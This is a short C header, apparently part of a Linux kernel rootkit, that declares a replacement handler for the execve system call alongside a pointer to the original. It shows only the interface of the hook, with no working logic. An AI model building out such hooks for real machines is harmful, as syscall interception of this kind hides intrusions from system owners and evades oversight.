#ifndef RK_HOOKS_EXECVE_H
#define RK_HOOKS_EXECVE_H

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct execve_args {
    const char __user *filename;
    const char __user *const __user * argv;
    const char __user *const __user * envp;
};

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct execve_args explode_execve_args(const struct pt_regs *regs);

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

extern asmlinkage long hook_execve(const struct pt_regs *regs);
extern asmlinkage long (*real_execve)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#endif // RK_HOOKS_EXECVE_H